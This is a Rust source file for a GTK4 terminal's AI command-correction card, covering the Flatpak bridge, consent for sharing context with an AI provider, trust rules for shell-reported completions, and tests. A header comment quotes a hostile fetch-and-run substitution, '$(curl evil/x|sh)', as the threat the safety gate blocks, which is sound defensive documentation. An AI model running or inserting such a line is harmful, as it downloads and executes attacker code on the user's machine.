//! Review-first correction for likely mistyped Block-mode commands.
//!
//! The engine is [`jterm_core::command_correction`], the union of the four
//! terminals' formerly duplicated copies. Classification, token extraction,
//! typo ranking, the safety gate, the provider prompt, the strict-JSON reply
//! parser, the helper-resolution policy, the bounded probes, the two-stage
//! resolver and the request epoch machine all moved there; forge's 1,020-line
//! private copy of that engine had no toolkit code in it at all, which is
//! exactly why it was free to drift from its siblings and did.
//!
//! What stays here is the surface, which is genuinely forge's: the inline card
//! in the block conversation (inserted just above the live prompt and styled
//! like a finished block rather than shown as a modal), the Notebook
//! attachment layer that reaches nested split leaves, the 50 ms GLib poller
//! that hands a worker result back to the main context, and — the piece no
//! sibling has — the tracked submission path, where a verified command is kept
//! present and insensitive until `CommandStart` proves its identity, with the
//! organism assist-pulse revoked if that proof never arrives.
//!
//! Adopting the union changed forge's behaviour in four ways worth naming:
//!
//! - **One gate, no exemptions.** forge split `validate_candidate` in two and
//!   ran deterministic candidates — target-output suggestions in particular —
//!   through the weaker half, which applied neither the privilege, remote,
//!   control-syntax nor pipe rules. That branch reads *untrusted, possibly
//!   remote* target output. The cost of closing it is a real false rejection
//!   (`apt install sud` -> `apt install sudo` is no longer offered); the
//!   benefit is that a host printing ``Did you mean '$(curl evil/x|sh)'?`` can
//!   no longer put that into a pre-filled, auto-focused command field.
//! - **Consent is stated.** forge shipped `ai_share_command_context`, honoured
//!   it in `agent_task_ui`, and skipped it here — on the surface with the
//!   largest payload of any of them. See [`context_sharing`].
//! - **Only a shell-reported status raises a card.** See
//!   [`completion_is_trusted`].
//! - **One helper-trust predicate.** The probes no longer route through
//!   `crate::host::helper_command`, whose `writable_by_current_user` trusts a
//!   *third* user's PATH binary and refuses every system helper under euid 0.
//!   forge's Flatpak host bridge is preserved — see [`local_evidence`] — but
//!   it is now a policy the engine drives, not a `Command` forge resolves.

use std::cell::RefCell;
use std::ffi::OsStr;
use std::rc::Rc;
use std::time::{Duration, Instant};

use gtk4::gdk;
use gtk4::glib;
use gtk4::prelude::*;

use jterm_core::block_contract::CompletionProvenance;
use jterm_core::command_correction::{
    correction_monitor_enabled, request_timed_out, resolve_correction_blocking, should_start,
    CompletionFacts, ContextSharing, CorrectionCandidate, CorrectionPolicy, CorrectionProposal,
    CorrectionRequest, CorrectionRequestState, HelperStrategy, LocalEvidence,
    CORRECTION_REQUEST_TIMEOUT,
};
use jterm_core::helper::TrustedHelper;

use super::command_review::{
    set_review_feedback, CommandReviewCard, CommandReviewSpec, ReviewPresentation,
};
use super::{pane_token, OrganismCorrectionSignal, PaneNode, UiState};
use crate::ai::AiCancellationToken;
use crate::block_view::TermView;
use crate::config::Config;

const MONITOR_DATA_KEY: &str = "forge-ai-command-correction-monitor";
const VIEW_DATA_KEY: &str = "forge-ai-command-correction-attached";
/// Names the probe's stdout reader thread, so a reader stuck on a descendant's
/// pipe is attributable to forge in `ps`/`gdb`.
const PROBE_THREAD_NAME: &str = "forge-correction-probe-output";
/// How often the main context checks the correction worker for a result.
const RESULT_POLL_INTERVAL: Duration = Duration::from_millis(50);

/// The sandbox-side half of forge's Flatpak host bridge.
///
/// The engine refuses to take a `Command` back from an app — a
/// `fn(&str) -> Option<Command>` hook would hand it an arbitrary program to
/// execute — so the bridge is expressed as a launcher plus fixed arguments and
/// the engine builds the argv itself. The launcher is then resolved by
/// `jterm_core::helper`'s predicate like any other helper, which is what stops
/// a PATH-planted `flatpak-spawn` from becoming the bridge. `crate::host`'s
/// own resolver falls back to a PATH lookup here; that fallback is dropped
/// deliberately, because under Flatpak `/usr/bin/flatpak-spawn` is provided by
/// the runtime and a bridge that has to be *searched for* is not one this
/// surface should spawn automatically.
static FLATPAK_SPAWN: TrustedHelper = TrustedHelper::new(
    "flatpak-spawn",
    &["/usr/bin/flatpak-spawn", "/bin/flatpak-spawn"],
);

/// `flatpak-spawn --host --watch-bus /bin/sh -c <launcher> <helper name>`.
///
/// `--watch-bus` is what puts the host-side command in the supervised process
/// group's blast radius: killing the bridge tears down the command it started.
/// The launcher script re-clamps `PATH` on the *host* side before `exec`, so a
/// project-local file named `bash` cannot become the probe merely because the
/// bridge inherited that project's directory. It is `crate::host`'s script,
/// not a second copy: one definition, two builders.
const HOST_BRIDGE_ARGS: &[&str] = &[
    "--host",
    "--watch-bus",
    "/bin/sh",
    "-c",
    crate::host::HOST_HELPER_LAUNCHER,
];

/// Where forge may look for evidence about the environment a failed command
/// actually ran in.
///
/// Three of the four terminals answered this with a buried `is_flatpak()` call
/// inside shared-looking code and got three different answers out of it; the
/// engine will not answer it at all. forge's answer has two branches and both
/// are capabilities, not defaults:
///
/// - Sandboxed, the process `PATH` describes the sandbox and says nothing
///   about the host where Block commands run, so PATH evidence must come from
///   the host's own `compgen` across the bridge. forge is the only terminal
///   that can do this; anvil abandons the probe *and* the walk under Flatpak
///   and so offers no PATH-verified correction at all.
/// - Native, the process `PATH` *is* that namespace, so it is evidence — and
///   [`HelperStrategy::TrustedPathScan`] keeps forge's existing reach on a host
///   whose helpers live outside `/usr/bin`, now under the engine's corrected
///   trust predicate rather than the one in `crate::host` that trusts a third
///   user's binary. The scan tries the fixed system candidates first, so it is
///   a superset of `FixedCandidates`, never a weakening of it.
fn local_evidence() -> LocalEvidence {
    local_evidence_for(
        crate::host::is_flatpak(),
        std::env::var_os("PATH").as_deref(),
    )
}

/// [`local_evidence`] with the sandbox decision and the lookup `PATH` made
/// explicit, mirroring `crate::host::helper_command_for` so both branches are
/// testable without a sandbox.
fn local_evidence_for(flatpak: bool, path: Option<&OsStr>) -> LocalEvidence {
    if flatpak {
        return LocalEvidence::Bridged {
            launcher: &FLATPAK_SPAWN,
            launcher_args: HOST_BRIDGE_ARGS,
        };
    }
    LocalEvidence::SameNamespace {
        search_path: path
            .map(|path| std::env::split_paths(path).collect())
            .unwrap_or_default(),
        helpers: HelperStrategy::TrustedPathScan,
    }
}

/// Whether this failure's command, working directory and up to 8 KiB of
/// terminal output may leave the machine.
///
/// forge ships `ai_share_command_context` (default off), documents it as
/// consent to attach command and terminal evidence to provider prompts, and
/// requires it before a native Codex task may start — and then posted exactly
/// that payload from this surface without consulting it. The engine now
/// demands the answer at construction and cannot build a prompt without it.
/// Local verified evidence (APT index, executable PATH, the target's own
/// suggestion) never leaves the machine and keeps working either way.
fn context_sharing(ai_enabled: bool, share_command_context: bool) -> ContextSharing {
    if ai_enabled && share_command_context {
        ContextSharing::Consented
    } else {
        ContextSharing::Withheld
    }
}

/// forge's three answers, together, for one request.
///
/// Built per request rather than at startup because consent is a live config
/// value: revoking `ai_share_command_context` must silence the provider
/// fallback for the *next* failed command, not at the next restart.
fn correction_policy(config: &Config) -> CorrectionPolicy {
    CorrectionPolicy::new(
        local_evidence(),
        context_sharing(config.ai_enabled, config.ai_share_command_context),
        PROBE_THREAD_NAME,
    )
}

/// Only a status the shell itself reported may raise a correction card.
///
/// A block closed by boundary inference — a later prompt forced it shut, the
/// end mark never arrived — attributes stale scrollback and a guessed status
/// to a command. The classifier would then read "command not found" out of the
/// *previous* command's output, and the prompt, the card and the insertion
/// would all be built on that misattribution. forge previously required only
/// that *some* number was present; frost's stricter rule is the one the family
/// adopted.
fn completion_is_trusted(provenance: CompletionProvenance) -> bool {
    matches!(provenance, CompletionProvenance::ShellReported)
}

impl UiState {
    /// Install one window-level listener which attaches the correction callback
    /// to every Block pane as pages are created or restored.
    ///
    /// `apply_dynamic_css` can run repeatedly, so this method is deliberately
    /// idempotent and stores its marker on the Notebook GObject.
    pub(crate) fn install_command_correction_monitor(&self) {
        if unsafe { self.notebook.data::<bool>(MONITOR_DATA_KEY).is_some() } {
            return;
        }
        unsafe {
            self.notebook.set_data(MONITOR_DATA_KEY, true);
        }

        let agent_session = Rc::downgrade(&self.agent_session);
        let organism_signal = self.organism_correction.clone();
        for index in 0..self.notebook.n_pages() {
            if let Some(page) = self.notebook.nth_page(Some(index)) {
                attach_page(&page, &self.config, &agent_session, &organism_signal);
            }
        }

        let config = self.config.clone();
        self.notebook
            .connect_page_added(move |_notebook, page, _page_num| {
                // Page creation attaches PaneLeaf controllers after insertion.
                // Deferring one main-loop turn avoids racing that attachment.
                let page = page.clone();
                let config = config.clone();
                let agent_session = agent_session.clone();
                let organism_signal = organism_signal.clone();
                glib::idle_add_local_once(move || {
                    attach_page(&page, &config, &agent_session, &organism_signal);
                });
            });
    }

    /// Attach correction monitoring immediately to a newly constructed split
    /// leaf. Nested splits do not emit Notebook `page-added`, so relying on the
    /// window-level listener alone would leave those panes unmonitored.
    pub(crate) fn attach_command_correction_to_view(&self, view: Rc<TermView>, remote: bool) {
        attach_term_view(
            view,
            self.config.clone(),
            Rc::downgrade(&self.agent_session),
            self.organism_correction.clone(),
            remote,
        );
    }
}

fn attach_page(
    page: &gtk4::Widget,
    config: &Rc<RefCell<Config>>,
    agent_session: &std::rc::Weak<RefCell<Option<super::AgentHandle>>>,
    organism_signal: &Rc<OrganismCorrectionSignal>,
) {
    let Some(node) = PaneNode::from_widget(page) else {
        return;
    };
    for leaf in node.leaves() {
        let remote = leaf.is_remote();
        if let Some(view) = leaf.block_view() {
            attach_term_view(
                view,
                config.clone(),
                agent_session.clone(),
                organism_signal.clone(),
                remote,
            );
        }
    }
}

fn attach_term_view(
    view: Rc<TermView>,
    config: Rc<RefCell<Config>>,
    agent_session: std::rc::Weak<RefCell<Option<super::AgentHandle>>>,
    organism_signal: Rc<OrganismCorrectionSignal>,
    remote: bool,
) {
    // A correction is only ever offered as an inline card. Where none can be
    // mounted at all, a proposal the user can neither see nor dismiss, whose
    // entry would silently take the keyboard, is worse than no proposal: skip
    // the whole monitor — no request, no worker thread, no AI call.
    if !view.supports_inline_notices() {
        log::debug!("pane has no card surface: command-correction monitor not attached");
        return;
    }

    let root = view.widget();
    if unsafe { root.data::<bool>(VIEW_DATA_KEY).is_some() } {
        return;
    }
    unsafe {
        root.set_data(VIEW_DATA_KEY, true);
    }

    // At most one correction card per pane; a newly finished command makes any
    // visible card and in-flight request stale before this failure is classified.
    let card_slot: Rc<RefCell<Option<gtk4::Widget>>> = Rc::new(RefCell::new(None));
    let request_state = Rc::new(CorrectionRequestState::default());
    let view_weak = Rc::downgrade(&view);
    view.connect_block_finished_with_output(
        move |command, exit_code, output, agent_generation, _duration_ms, provenance| {
            let generation = request_state.advance();
            let Some(view) = view_weak.upgrade() else {
                return;
            };
            if let Some(card) = card_slot.borrow_mut().take() {
                view.remove_inline_notice(&card);
            }

            let agent_active = agent_session
                .upgrade()
                .is_some_and(|slot| slot.borrow().is_some());
            let monitor_enabled = {
                let config = config.borrow();
                correction_monitor_enabled(
                    config.ai_enabled,
                    config.command_correction_enabled,
                    agent_active,
                )
            };

            // The engine owns the whole trigger contract, including the
            // head/tail sample: `output` arrives at the block view's own 32 KiB
            // event bound and must be handed over whole, because sampling it
            // here and again in the prompt builder elides real content twice.
            let Some(request) = should_start(
                monitor_enabled,
                CompletionFacts {
                    command,
                    exit_code,
                    output,
                    cwd: Some(view.cwd()),
                    remote,
                    // A generation is bound only to a command the Shell Agent
                    // itself submitted; correcting one would fight the agent.
                    agent_issued: agent_generation.is_some(),
                    trusted_completion: completion_is_trusted(provenance),
                },
            ) else {
                return;
            };

            request_correction(
                config.clone(),
                Rc::downgrade(&view),
                card_slot.clone(),
                request_state.clone(),
                generation,
                agent_session.clone(),
                organism_signal.clone(),
                request,
            );
        },
    );
}

#[allow(clippy::too_many_arguments)]
fn request_correction(
    config: Rc<RefCell<Config>>,
    target: std::rc::Weak<TermView>,
    card_slot: Rc<RefCell<Option<gtk4::Widget>>>,
    request_state: Rc<CorrectionRequestState>,
    generation: u64,
    agent_session: std::rc::Weak<RefCell<Option<super::AgentHandle>>>,
    organism_signal: Rc<OrganismCorrectionSignal>,
    request: CorrectionRequest,
) {
    // A missing credential should not disable verified local correction. The AI
    // client is optional and is consulted only when deterministic resolution
    // cannot produce a candidate — and, now, only when the policy says this
    // failure's context may leave the machine.
    let (client, policy) = {
        let config = config.borrow();
        (
            crate::ai::client_from_config(&config).ok(),
            correction_policy(&config),
        )
    };
    let cancellation = AiCancellationToken::new();
    if !request_state.start(generation, cancellation.clone()) {
        return;
    }
    let cancellation_for_worker = cancellation.clone();
    let deadline = Instant::now() + CORRECTION_REQUEST_TIMEOUT;
    let request_for_worker = request.clone();
    let (tx, rx) = std::sync::mpsc::sync_channel(1);
    let worker = std::thread::Builder::new()
        .name("forge-command-correction".to_string())
        .spawn(move || {
            let result = resolve_correction_blocking(
                &policy,
                &request_for_worker,
                client.as_ref(),
                &cancellation_for_worker,
                deadline,
            );
            let _ = tx.send(result);
        });
    if let Err(error) = worker {
        request_state.finish(generation);
        log::warn!("could not start command correction worker: {error}");
        return;
    }

    let rx = RefCell::new(rx);
    let started = Instant::now();
    glib::timeout_add_local(RESULT_POLL_INTERVAL, move || {
        if !request_state.is_current(generation) {
            return glib::ControlFlow::Break;
        }
        let Some(view) = target.upgrade() else {
            request_state.cancel(generation);
            return glib::ControlFlow::Break;
        };
        let monitor_enabled = {
            let config = config.borrow();
            let agent_active = agent_session
                .upgrade()
                .is_some_and(|slot| slot.borrow().is_some());
            correction_monitor_enabled(
                config.ai_enabled,
                config.command_correction_enabled,
                agent_active,
            )
        };
        if !monitor_enabled {
            request_state.cancel(generation);
            return glib::ControlFlow::Break;
        }
        if request_timed_out(started, Instant::now(), CORRECTION_REQUEST_TIMEOUT) {
            request_state.cancel(generation);
            log::warn!(
                "command correction timed out after {} seconds",
                CORRECTION_REQUEST_TIMEOUT.as_secs()
            );
            return glib::ControlFlow::Break;
        }
        match rx.borrow().try_recv() {
            Ok(Ok(Some(candidate))) => {
                if !request_state.finish(generation) {
                    return glib::ControlFlow::Break;
                }
                show_correction_card(
                    &view,
                    &card_slot,
                    request_state.clone(),
                    generation,
                    &config,
                    &organism_signal,
                    &request,
                    candidate,
                );
                glib::ControlFlow::Break
            }
            Ok(Ok(None)) => {
                request_state.finish(generation);
                glib::ControlFlow::Break
            }
            Ok(Err(error)) => {
                request_state.finish(generation);
                log::warn!("command correction failed: {error}");
                glib::ControlFlow::Break
            }
            Err(std::sync::mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
            Err(std::sync::mpsc::TryRecvError::Disconnected) => {
                request_state.finish(generation);
                log::warn!("command correction worker disconnected");
                glib::ControlFlow::Break
            }
        }
    });
}

const RUN_LABEL: &str = "Run verified command";
const INSERT_LABEL: &str = "Insert for review";

/// Present a correction proposal as an inline card in the block conversation.
///
/// The card is inserted just above the live prompt and styled like a finished
/// block, so reviewing, editing, accepting, or dismissing the proposal reads
/// like part of the normal Block-mode command dialogue instead of a modal
/// window. A later finished command removes it and advances the pane epoch.
///
/// Every string rendered here comes from the engine already sanitised: the
/// title, the badge (which now carries the exit status forge's card used to
/// omit) and the description, whose failed-command preview is bounded to 160
/// characters so a long mistyped one-liner cannot push the command field and
/// its buttons out of view.
#[allow(clippy::too_many_arguments)]
fn show_correction_card(
    view: &Rc<TermView>,
    card_slot: &Rc<RefCell<Option<gtk4::Widget>>>,
    request_state: Rc<CorrectionRequestState>,
    generation: u64,
    config: &Rc<RefCell<Config>>,
    organism_signal: &Rc<OrganismCorrectionSignal>,
    request: &CorrectionRequest,
    candidate: CorrectionCandidate,
) {
    let compact = config.borrow().block_compact;
    let spec = CommandReviewSpec {
        presentation: ReviewPresentation::Standalone,
        compact,
        icon: "dialog-information-symbolic",
        title: candidate.display_title().to_string(),
        badge: candidate.display_badge(request.exit_code()),
        description: candidate.display_description(request.command()),
        command: candidate.command().to_string(),
        primary_label: if candidate.run_allowed(candidate.command()) {
            RUN_LABEL.to_string()
        } else {
            INSERT_LABEL.to_string()
        },
        primary_executes: candidate.run_allowed(candidate.command()),
        auxiliary_label: None,
        secondary_label: Some("Dismiss".to_string()),
        close_button: true,
    };
    // The proposal owns the candidate and the live draft together, so the
    // run-versus-insert answer is computed once, from the validated form of
    // exactly the text `accept` will submit. Deriving it separately for the
    // label and for the action is how a card came to say "Insert for review"
    // while the shim ran the command.
    let proposal = Rc::new(RefCell::new(CorrectionProposal::new(candidate)));
    let review = CommandReviewCard::new(spec);

    // ── Insert into the block conversation ────────────────────────────────
    review.root.add_css_class("block-correction");
    let card: gtk4::Widget = review.root.clone().upcast();
    *card_slot.borrow_mut() = Some(card.clone());
    if !view.insert_inline_notice(&card) {
        // Nothing was mounted (Unified mode), so there is no card to dismiss
        // and nothing to focus. Attaching the monitor is already refused for
        // such panes; this keeps the invariant local to the one place that
        // would otherwise move the keyboard into an off-screen entry.
        card_slot.borrow_mut().take();
        log::debug!("command correction not shown: this pane cannot host an inline card");
        return;
    }
    // Take keyboard focus only when the prompt is clean and idle; a prompt the
    // user is already typing into must keep its keystrokes.
    if view.can_accept_agent_command() {
        review.focus();
    }

    let view_weak = Rc::downgrade(view);
    let card_weak = card.downgrade();
    let remove_card = {
        let view_weak = view_weak.clone();
        let card_slot = card_slot.clone();
        let card_weak = card_weak.clone();
        Rc::new(move |refocus_terminal: bool| {
            card_slot.borrow_mut().take();
            if let Some(view) = view_weak.upgrade() {
                if let Some(card) = card_weak.upgrade() {
                    view.remove_inline_notice(&card);
                }
                if refocus_terminal {
                    view.grab_focus();
                }
            }
        })
    };
    let dismiss = {
        let request_state = request_state.clone();
        let remove_card = remove_card.clone();
        let organism_signal = organism_signal.clone();
        Rc::new(move |refocus_terminal: bool| {
            if request_state.retire(generation) {
                // Content-free pulse: only the fact of the dismissal.
                organism_signal.note_dismissed();
                remove_card(refocus_terminal);
            }
        })
    };

    if let Some(close) = review.close.as_ref() {
        let dismiss = dismiss.clone();
        close.connect_clicked(move |_| dismiss(true));
    }
    if let Some(dismiss_button) = review.secondary.as_ref() {
        let dismiss = dismiss.clone();
        dismiss_button.connect_clicked(move |_| dismiss(true));
    }
    {
        let dismiss = dismiss.clone();
        let key_ctrl = gtk4::EventControllerKey::new();
        key_ctrl.set_propagation_phase(gtk4::PropagationPhase::Capture);
        key_ctrl.connect_key_pressed(move |_, keyval, _, _| {
            if keyval == gdk::Key::Escape {
                dismiss(true);
                glib::Propagation::Stop
            } else {
                glib::Propagation::Proceed
            }
        });
        review.root.add_controller(key_ctrl);
    }

    // Editing a verified candidate immediately turns the primary action into a
    // non-executing insertion. Returning exactly to the verified text restores
    // the direct-run affordance. One closure owns both the draft update and the
    // label, so the two cannot disagree.
    let sync_primary = {
        let proposal = proposal.clone();
        let primary = review.primary_controller();
        Rc::new(move |text: &str| {
            let executes = {
                let mut proposal = proposal.borrow_mut();
                let draft = proposal.draft_mut();
                draft.clear();
                draft.push_str(text);
                proposal.run_allowed()
            };
            primary.set(
                if executes { RUN_LABEL } else { INSERT_LABEL },
                executes,
                text,
            );
        })
    };
    // The card withholds a proposal its own review gate rejects, leaving the
    // entry empty; sync once so the label describes what is actually there.
    sync_primary(review.entry.text().as_str());
    {
        let sync_primary = sync_primary.clone();
        review
            .entry
            .connect_changed(move |entry| sync_primary(entry.text().as_str()));
    }

    let feedback = review.feedback.clone();
    let review_root = review.root.clone();
    let request_state_for_accept = request_state.clone();
    let remove_card_for_accept = remove_card.clone();
    let organism_signal_for_accept = organism_signal.clone();
    let accept = Rc::new(move |edited: String| {
        if !request_state_for_accept.is_generation(generation) {
            return;
        }
        let Some(view) = view_weak.upgrade() else {
            return;
        };
        let show_error = |text: &str| {
            set_review_feedback(&feedback, text, true);
        };
        // Re-validate against this surface's own 16 KiB budget and take the run
        // decision from the same validated string in one step.
        let accepted = {
            let mut proposal = proposal.borrow_mut();
            let draft = proposal.draft_mut();
            draft.clear();
            draft.push_str(&edited);
            proposal.accept()
        };
        let accepted = match accepted {
            Ok(accepted) => accepted,
            Err(error) => {
                show_error(&format!("Invalid corrected command: {error}"));
                return;
            }
        };
        let prompt_status = view.command_prompt_status();
        if !prompt_status.is_ready() {
            show_error(prompt_status.blocked_message());
            return;
        }

        let command = accepted.command;
        let pane = pane_token(&view);
        view.grab_focus();
        if accepted.run_directly {
            let feedback_for_completion = feedback.clone();
            let root_for_completion = review_root.clone();
            let request_state_for_completion = request_state_for_accept.clone();
            let remove_card_for_completion = remove_card_for_accept.clone();
            let organism_for_completion = organism_signal_for_accept.clone();
            let queued = view.submit_command_tracked(&command, move |result| match result {
                Ok(()) => {
                    if request_state_for_completion.retire(generation) {
                        remove_card_for_completion(false);
                    }
                }
                Err(error) => {
                    // The reviewed command may never have run; a pending
                    // assist pulse must not attach to whatever runs next.
                    organism_for_completion.revoke_accept(pane);
                    root_for_completion.set_sensitive(true);
                    if request_state_for_completion.is_generation(generation) {
                        set_review_feedback(
                            &feedback_for_completion,
                            &format!(
                                "Reviewed command could not be verified; it may not have run, or a different command may have started. Inspect the terminal before retrying: {error}"
                            ),
                            true,
                        );
                    }
                }
            });
            if let Err(error) = queued {
                show_error(&format!("Command was not sent: {error}"));
                return;
            }
            // Content-free pulse: the help was accepted and is about to run.
            organism_signal_for_accept.note_accepted(pane);
            // Keep the proposal present until CommandStart proves the reviewed
            // identity. This also prevents a close/edit click from racing VTE
            // verification or a shell-side redraw after CR admission.
            review_root.set_sensitive(false);
            return;
        }

        if let Err(error) = view.write_input(command.as_bytes()) {
            show_error(&format!("Command was not sent: {error}"));
            return;
        }
        // Content-free pulse: the insertion was accepted for review.
        organism_signal_for_accept.note_accepted(pane);
        // Non-executing insertion is complete once the bounded PTY queue owns
        // the bytes; it intentionally leaves Enter to the user.
        if !request_state_for_accept.retire(generation) {
            log::error!("correction generation changed during synchronous PTY admission");
        }
        remove_card_for_accept(false);
    });

    {
        let accept = accept.clone();
        let entry = review.entry.clone();
        review
            .primary
            .connect_clicked(move |_| accept(entry.text().to_string()));
    }
    review
        .entry
        .connect_activate(move |entry| accept(entry.text().to_string()));
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The engine's own behaviour — classification, ranking, the safety gate,
    /// the prompt, the reply parser, the probes, the epoch machine — is covered
    /// by `jterm_core::command_correction`. What forge owns is the three
    /// policy answers and the trigger's trust rule, so that is what these pin.
    #[test]
    fn the_flatpak_bridge_is_stated_as_policy_rather_than_resolved_by_forge() {
        let LocalEvidence::Bridged {
            launcher,
            launcher_args,
        } = local_evidence_for(true, Some(OsStr::new("/opt/hostile/bin:/usr/bin")))
        else {
            panic!("a sandboxed forge must reach its host through the bridge");
        };
        // The bridge program is a helper like any other, so it passes the same
        // trust predicate as the probes it launches.
        assert_eq!(launcher.name(), "flatpak-spawn");
        // Byte-for-byte the argv `crate::host` builds for its own Flatpak
        // branch, minus the helper name the engine appends itself.
        assert_eq!(
            launcher_args,
            [
                "--host",
                "--watch-bus",
                "/bin/sh",
                "-c",
                crate::host::HOST_HELPER_LAUNCHER,
            ]
        );
    }

    /// Under a bridge the process PATH describes the sandbox; natively it *is*
    /// the namespace the failed command resolved against. Answering
    /// `Unavailable` in either branch would silently retire evidence forge can
    /// actually produce — which is what anvil does under Flatpak.
    #[test]
    fn a_native_forge_offers_its_own_path_as_evidence_under_the_shared_predicate() {
        let LocalEvidence::SameNamespace {
            search_path,
            helpers,
        } = local_evidence_for(false, Some(OsStr::new("/usr/bin:/opt/pkg/bin")))
        else {
            panic!("a native forge's own PATH is evidence about its Block commands");
        };
        assert_eq!(
            search_path,
            [
                std::path::PathBuf::from("/usr/bin"),
                std::path::PathBuf::from("/opt/pkg/bin"),
            ]
        );
        // The scan, not fixed candidates: forge resolved helpers from PATH
        // before this extraction, and dropping to fixed candidates would lose
        // APT and `compgen` evidence on any host whose helpers are not in
        // /usr/bin. What changes is the predicate, not the pathname list.
        assert_eq!(helpers, HelperStrategy::TrustedPathScan);

        // No PATH at all is not a reason to walk a relative directory.
        let LocalEvidence::SameNamespace { search_path, .. } = local_evidence_for(false, None)
        else {
            panic!("still the same namespace");
        };
        assert!(search_path.is_empty());
    }

    /// forge shipped the consent switch, required it before starting a Codex
    /// task, and then posted the command, cwd and terminal output from this
    /// surface without consulting it.
    #[test]
    fn provider_context_needs_consent_that_forge_previously_never_asked_for() {
        assert_eq!(context_sharing(true, true), ContextSharing::Consented);
        assert_eq!(context_sharing(true, false), ContextSharing::Withheld);
        assert_eq!(context_sharing(false, true), ContextSharing::Withheld);
        assert_eq!(context_sharing(false, false), ContextSharing::Withheld);
    }

    /// Only a status the shell itself reported. A boundary-inferred completion
    /// carries a guessed status over scrollback that may belong to an earlier
    /// command, and forge accepted every one of them.
    #[test]
    fn only_a_shell_reported_completion_may_raise_a_card() {
        assert!(completion_is_trusted(CompletionProvenance::ShellReported));
        for untrusted in [
            CompletionProvenance::BoundaryInferred,
            CompletionProvenance::JournalRecovered,
            CompletionProvenance::Unknown,
        ] {
            assert!(!completion_is_trusted(untrusted), "{untrusted:?}");
        }
    }

    /// The whole trigger, through the engine, with forge's own facts: the
    /// classified failure must survive the gate, and each of forge's three
    /// suppressions must stop it on its own.
    #[test]
    fn forge_facts_reach_the_engine_and_each_suppression_stops_them() {
        let facts = || CompletionFacts {
            command: "apt install fmpg".to_string(),
            exit_code: Some(100),
            output: "E: Unable to locate package fmpg".to_string(),
            cwd: Some("/home/user/project".to_string()),
            remote: false,
            agent_issued: false,
            trusted_completion: true,
        };
        let request = should_start(true, facts()).expect("a classified typo raises a request");
        assert_eq!(request.command(), "apt install fmpg");
        assert_eq!(request.exit_code(), 100);
        assert_eq!(request.cwd(), "/home/user/project");

        assert!(should_start(false, facts()).is_none(), "monitor disabled");
        assert!(
            should_start(
                true,
                CompletionFacts {
                    agent_issued: true,
                    ..facts()
                }
            )
            .is_none(),
            "the Shell Agent submitted this command"
        );
        assert!(
            should_start(
                true,
                CompletionFacts {
                    trusted_completion: completion_is_trusted(
                        CompletionProvenance::BoundaryInferred
                    ),
                    ..facts()
                }
            )
            .is_none(),
            "the shell never reported this status"
        );
        assert!(
            should_start(
                true,
                CompletionFacts {
                    exit_code: None,
                    ..facts()
                }
            )
            .is_none(),
            "no status is not a failure signal"
        );
    }
}
